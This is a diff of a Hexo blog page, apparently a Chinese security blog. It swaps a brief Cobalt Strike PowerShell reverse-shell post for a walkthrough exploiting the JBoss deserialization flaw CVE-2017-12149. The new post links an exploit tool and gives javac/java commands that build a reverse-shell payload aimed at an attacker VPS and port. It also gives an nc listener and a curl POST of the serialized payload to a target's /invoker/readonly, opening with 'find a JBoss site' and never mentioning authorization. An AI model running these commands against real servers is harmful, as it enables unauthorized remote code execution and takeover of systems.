@@ -5,26 +5,27 @@
   
 
   
-  <title>powershell反弹shell | Hexo</title>
+  <title>通过jboss反弹shell | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
   
-  <meta name="description" content="首先要进行监听 第二步在脚本web中选择脚本类型。但不能使用正在使用的端口 第三步将生成的代码复制到cmd中即可： 就可以在cs上监控到上线">
+  <meta name="description" content="漏洞介绍CVE编号：CVE-2017-12149影响版本：影响版本为JBoss5.x-6.x漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。 漏洞复现首先我们要找到一个jboss搭建的网站，访问路径/invoker/readonly 出现5">
 <meta property="og:type" content="article">
-<meta property="og:title" content="powershell反弹shell">
-<meta property="og:url" content="http://yoursite.com/2019/09/27/cs的使用教程/index.html">
+<meta property="og:title" content="通过jboss反弹shell">
+<meta property="og:url" content="http://yoursite.com/2019/11/12/通过jboss反弹shell/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="首先要进行监听 第二步在脚本web中选择脚本类型。但不能使用正在使用的端口 第三步将生成的代码复制到cmd中即可： 就可以在cs上监控到上线">
+<meta property="og:description" content="漏洞介绍CVE编号：CVE-2017-12149影响版本：影响版本为JBoss5.x-6.x漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。 漏洞复现首先我们要找到一个jboss搭建的网站，访问路径/invoker/readonly 出现5">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http://yoursite.com/img/powershell.png">
-<meta property="og:image" content="http://yoursite.com/img/2.png">
-<meta property="og:image" content="http://yoursite.com/img/3.png">
-<meta property="og:updated_time" content="2019-10-06T13:33:15.358Z">
+<meta property="og:image" content="http://yoursite.com/images/01.png">
+<meta property="og:image" content="http://yoursite.com/images/02.png">
+<meta property="og:image" content="http://yoursite.com/images/03.png">
+<meta property="og:image" content="http://yoursite.com/images/04.png">
+<meta property="og:updated_time" content="2019-11-12T14:10:42.542Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="powershell反弹shell">
-<meta name="twitter:description" content="首先要进行监听 第二步在脚本web中选择脚本类型。但不能使用正在使用的端口 第三步将生成的代码复制到cmd中即可： 就可以在cs上监控到上线">
-<meta name="twitter:image" content="http://yoursite.com/img/powershell.png">
+<meta name="twitter:title" content="通过jboss反弹shell">
+<meta name="twitter:description" content="漏洞介绍CVE编号：CVE-2017-12149影响版本：影响版本为JBoss5.x-6.x漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。 漏洞复现首先我们要找到一个jboss搭建的网站，访问路径/invoker/readonly 出现5">
+<meta name="twitter:image" content="http://yoursite.com/images/01.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -61,21 +62,21 @@
   </div>
 </header>
       <div id="middlecontent" title class="global-width sidebar-right">
-        <section id="main"><article id="post-cs的使用教程" class="article global-container article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-通过jboss反弹shell" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
       
   
     <h1 class="article-title" itemprop="name">
-      powershell反弹shell
+      通过jboss反弹shell
     </h1>
   
 
     </header>
   
   <div class="article-meta">
-    <a href="/2019/09/27/cs的使用教程/" class="article-date">
-  <time datetime="2019-09-27T03:46:16.000Z" itemprop="datePublished">2019-09-27</time>
+    <a href="/2019/11/12/通过jboss反弹shell/" class="article-date">
+  <time datetime="2019-11-12T14:03:01.000Z" itemprop="datePublished">2019-11-12</time>
 </a>
     
     
@@ -90,10 +91,10 @@
     
     <div class="article-content article-content-cloud" itemprop="articleBody">
       
-        <p>首先要进行监听<br><img src="/img/powershell.png" alt></p>
-<p>第二步在脚本web中选择脚本类型。但不能使用正在使用的端口<br><img src="/img/2.png" alt></p>
-<p>第三步将生成的代码复制到cmd中即可：<br><img src="/img/3.png" alt></p>
-<p>就可以在cs上监控到上线</p>
+        <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>CVE编号：CVE-2017-12149<br>影响版本：影响版本为JBoss5.x-6.x<br>漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先我们要找到一个jboss搭建的网站，访问路径/invoker/readonly 出现500，那么说明可能存在漏洞<br><img src="/images/01.png" alt><br>以防万一，我们再使用jboss的检测工具，检测一下，发现存在jboss漏洞<br><img src="/images/02.png" alt></p>
+<p>下载利用工具：JavaDeserH2HC（<a href="http://scan.javasec.cn/java/JavaDeserH2HC.zip）" target="_blank" rel="noopener">http://scan.javasec.cn/java/JavaDeserH2HC.zip）</a><br>接下来输入命令：<br>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java<br>java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap +vps：port //反弹shell的IP和端口<br><img src="/images/03.png" alt><br>在本地监听端口：<br>nc -lvvp 1234</p>
+<p>再次执行以下命令：<br>curl <a href="http://ip:8080/invoker/readonly" target="_blank" rel="noopener">http://ip:8080/invoker/readonly</a> –data-binary @ReverseShellCommonsCollectionsHashMap.ser<br><img src="/images/04.png" alt><br>反弹成功</p>
 
       
     </div>
@@ -108,20 +109,11 @@
 <nav id="article-nav">
   <div class="article-nav-block">
     
-      <a href="/2019/10/11/使用cmd开启3389端口的方法/" id="article-nav-newer" class="article-nav-link-wrap">
-        <strong class="article-nav-caption"></strong>
-        <div class="article-nav-title">
-          
-            使用cmd开启3389端口的方法
-          
-        </div>
-      </a>
-    
   </div>
   <div class="article-nav-block">
     
-      <a href="/2019/09/25/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-        <div class="article-nav-title">Hello World</div>
+      <a href="/2019/10/11/使用cmd开启3389端口的方法/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">使用cmd开启3389端口的方法</div>
         <strong class="article-nav-caption"></strong>
       </a>
     
